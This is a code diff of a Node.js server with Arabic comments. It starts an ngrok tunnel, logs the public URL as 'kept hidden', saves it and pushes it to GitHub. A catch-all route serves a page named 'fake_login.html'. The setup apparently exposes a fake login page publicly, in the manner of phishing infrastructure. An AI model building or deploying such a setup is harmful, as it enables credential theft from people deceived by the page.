@@ -214,66 +214,56 @@ console.error = (...args) => {
 
 // ✅ بدء الخادم و ngrok
 app.listen(PORT, () => {
-  console.log(`🚀 Server running at http://localhost:${PORT}`);
-  console.log("⏳ Waiting for ngrok to start before opening terminal page...");
+    console.log(`🚀 Server running at http://localhost:${PORT}`);
+    
 
-  syncModelToPublic();
+  // 🟢 نسخ أولي عند تشغيل السيرفر
+    syncModelToPublic();
 
-  // ✅ أوقف أي ngrok قديم
-  exec("pgrep -f 'ngrok' && pkill -f 'ngrok'", () => {
-    // ✅ شغّل ngrok
-    exec("ngrok.exe http 3000 --log=stdout", (err) => {
-      if (err) return console.error("❌ Error starting ngrok:", err);
-      console.log("✅ ngrok started successfully!");
+    exec("pgrep -f 'ngrok' && pkill -f 'ngrok'", () => {
+        exec("ngrok.exe http 3000 --log=stdout", (err) => {
+            if (err) return console.error("❌ Error starting ngrok:", err);
+            console.log("✅ ngrok started successfully!");
+        });
+
+        setTimeout(() => {
+            exec("curl -s http://127.0.0.1:4040/api/tunnels", (err, stdout) => {
+                if (err || !stdout) {
+                    exec("powershell -Command \"(Invoke-WebRequest -Uri 'http://127.0.0.1:4040/api/tunnels' -UseBasicParsing).Content\"", (psErr, psStdout) => {
+                        if (psErr || !psStdout) return console.error("❌ Error fetching ngrok URL:", psErr);
+                        processNgrokResponse(psStdout);
+                    });
+                } else {
+                    processNgrokResponse(stdout);
+                }
+            });
+        }, 5000);
     });
-
-    // ✅ بعد 5 ثواني حاول الحصول على الرابط العام
-    setTimeout(() => {
-      exec("curl -s http://127.0.0.1:4040/api/tunnels", (err, stdout) => {
-        if (err || !stdout) {
-          exec("powershell -Command \"(Invoke-WebRequest -Uri 'http://127.0.0.1:4040/api/tunnels' -UseBasicParsing).Content\"", (psErr, psStdout) => {
-            if (psErr || !psStdout) return console.error("❌ Error fetching ngrok URL:", psErr);
-            processNgrokResponse(psStdout);
-          });
-        } else {
-          processNgrokResponse(stdout);
-        }
-      });
-    }, 5000);
-  });
 });
 
 // ✅ تحليل رد ngrok + فتح الرابط تلقائياً في المتصفح
-// ✅ تحليل رد ngrok بدون فتح أي شيء تلقائيًا
+// ✅ تحليل رد ngrok + فتح صفحة التيرمينال المحلية بدل فتح رابط ngrok
 function processNgrokResponse(response) {
   try {
     const tunnels = JSON.parse(response);
     serverUrl = tunnels.tunnels[0]?.public_url;
     if (serverUrl) {
-      console.log(`✅ Server is available at: 🔗 ${serverUrl}`);
+      // سجل الـ ngrok URL لكن لا تفتحه مباشرة
+      console.log(`✅ ngrok is available (kept hidden): ${serverUrl}`);
       fs.writeFileSync("serverUrl.json", JSON.stringify({ serverUrl }));
-
-      // ✅ رفع المشروع إلى GitHub
       pushToGitHub();
 
-      // ✅ لا تفتح ngrok تلقائيًا.. فقط افتح صفحة التيرمينال من public
-      const terminalPath = path.join(process.cwd(), "public", "terminal.html");
-
-      if (fs.existsSync(terminalPath)) {
-        console.log("🖥️ ngrok URL is ready — waiting for user action to open it from the terminal page.");
-        console.log("✅ Opening local terminal page...");
-        openInBrowser(`http://localhost:${PORT}/terminal.html`);
-      } else {
-        console.warn("⚠️ terminal.html not found in public folder!");
-      }
+      // افتح صفحة التيرمينال المحلية ضمن public (SSE) بدل فتح رابط ngrok
+      const localTerminal = `http://localhost:${PORT}/terminal.html`;
+      openInBrowser(localTerminal);
+      console.log('✅ Opened local terminal page and waiting for activity...');
     } else {
-      console.log("⚠️ No ngrok URL found in response.");
+      console.log("⚠️ No ngrok URL found.");
     }
   } catch (e) {
     console.error("❌ Error parsing ngrok response:", e);
   }
 }
-
 
 // فتح الرابط في المتصفح الافتراضي (Windows / macOS / Linux)
 
@@ -625,14 +615,4 @@ app.get('*', (req, res) => {
   }
 
   res.sendFile(path.join(process.cwd(), 'public', 'fake_login.html'));
-});
-
-
-// ✅ API لفتح ngrok عند الضغط من التيرمينال
-app.post('/api/open-ngrok', (req, res) => {
-  if (!serverUrl) return res.status(400).json({ message: "❌ ngrok URL not ready yet" });
-
-  console.log("🚀 Launching ngrok URL in Chrome by user action...");
-  openInBrowser(serverUrl);
-  res.json({ message: "✅ ngrok URL opened successfully!", url: serverUrl });
 });
